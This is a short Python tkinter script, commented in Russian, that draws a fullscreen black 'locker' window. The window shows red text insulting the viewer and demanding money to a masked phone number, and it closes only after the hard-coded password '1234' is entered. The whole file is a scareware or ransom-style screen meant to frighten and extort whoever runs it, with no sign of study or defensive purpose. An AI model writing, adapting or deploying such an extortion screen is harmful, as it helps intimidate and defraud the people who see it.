import tkinter as tk
from tkinter import messagebox

def check_password():
    if password_entry.get() == "1234":
        root.destroy()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль!")
        password_entry.delete(0, tk.END)  # Очищаем поле ввода

# Создаем главное окно
root = tk.Tk()
root.title(" ")
root.attributes('-fullscreen', True)  # Полноэкранный режим
root.configure(bg='black')

# Убираем иконку (крестик в заголовке)
root.overrideredirect(False)  # Оставляем стандартное поведение окна
try:
    root.iconbitmap('')  # Пустая иконка
except:
    pass

# Красный текст по центру
label = tk.Label(
    root,
    text="Поздравляем, вы далбоёб!\nСкидывайте деньги на этот номер: +7 XXX XXX XX XX",
    fg='red',
    bg='black',
    font=('Arial', 24, 'bold'),
    justify='center'
)
label.place(relx=0.5, rely=0.4, anchor='center')

# Поле для пароля
password_entry = tk.Entry(
    root,
    show="*",
    font=('Arial', 18),
    width=20
)
password_entry.place(relx=0.5, rely=0.5, anchor='center')

# Кнопка проверки
button = tk.Button(
    root,
    text="Проверить пароль",
    command=check_password,
    bg='black',
    fg='white',
    font=('Arial', 16),
    relief='flat'
)
button.place(relx=0.5, rely=0.6, anchor='center')

root.mainloop()